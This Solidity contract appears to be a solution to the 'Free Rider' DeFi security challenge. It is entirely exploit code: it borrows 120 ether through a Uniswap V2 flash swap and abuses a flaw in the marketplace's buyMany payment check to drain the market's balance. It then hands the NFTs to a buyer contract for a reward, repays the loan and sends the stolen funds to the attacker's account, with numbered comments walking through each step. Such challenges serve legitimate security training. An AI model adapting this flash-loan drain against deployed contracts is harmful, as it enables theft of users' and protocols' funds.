// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderBuyer.sol";

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface IFreeRiderNFTMarketplace {
    function offerMany(
        uint256[] calldata tokenIds,
        uint256[] calldata prices
    ) external;

    function buyMany(uint256[] calldata tokenIds) external payable;

    function token() external returns (IERC721);
}

interface IWETH {
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract FreeRiderHack is IUniswapV2Callee, IERC721Receiver {
    address immutable attacker;
    IUniswapV2Pair immutable uniswapPair;
    IFreeRiderNFTMarketplace immutable nftMarketplace;
    IWETH immutable weth;
    IERC721 immutable nft;
    address freeRiderBuyer;

    constructor(
        IUniswapV2Pair _uniswapPair,
        IFreeRiderNFTMarketplace _nftMarketplace,
        IWETH _weth,
        address _freeRiderBuyer
    ) {
        attacker = msg.sender;
        uniswapPair = _uniswapPair;
        nftMarketplace = _nftMarketplace;
        weth = _weth;
        nft = _nftMarketplace.token();
        freeRiderBuyer = _freeRiderBuyer;
    }

    // 1. Trigger flash swap.
    function pwn() external {
        uniswapPair.swap(120 ether, 0, address(this), hex"00");
    }

    // 2. Uniswap callback after receiving flash swap.
    function uniswapV2Call(
        address,
        uint,
        uint,
        bytes calldata
    ) external override {
        weth.withdraw(120 ether);

        // 3. Buy 2 NFTs for 15 ether each.
        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        nftMarketplace.buyMany{value: 30 ether}(tokenIds);

        // 4. Put them back on sale for 90 ether each.
        nft.setApprovalForAll(address(nftMarketplace), true);
        uint256[] memory prices = new uint256[](2);
        prices[0] = 90 ether;
        prices[1] = 90 ether;
        nftMarketplace.offerMany(tokenIds, prices);

        // 5. Buy them both but only send 90 ether, the other 90 will be drained from the market's own balance.
        nftMarketplace.buyMany{value: 90 ether}(tokenIds);

        // 7. Buy remaining 4 NFTs with 60 ether we gained.
        tokenIds = new uint256[](4);
        tokenIds[0] = 2;
        tokenIds[1] = 3;
        tokenIds[2] = 4;
        tokenIds[3] = 5;
        nftMarketplace.buyMany{value: 60 ether}(tokenIds);

        // 8. Send all 6 NFTs to buyer's contract.
        for (uint8 tokenId = 0; tokenId < 6; tokenId++) {
            nft.safeTransferFrom(address(this), freeRiderBuyer, tokenId);
        }

        // 10. Calculate fee and pay back loan.
        uint256 fee = ((120 ether * 3) / uint256(997)) + 1;
        weth.deposit{value: 120 ether + fee}();
        weth.transfer(address(uniswapPair), 120 ether + fee);

        // 11. Transfer spoils to attacker's EOA.
        payable(address(attacker)).transfer(address(this).balance);
    }

    // 6. We'll receive 180 ether as the seller of NFTs, half from our selves, other half stolen.
    // 9. We receive our 45 ether reward after we sent the last NFT to the buyer's contract.
    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
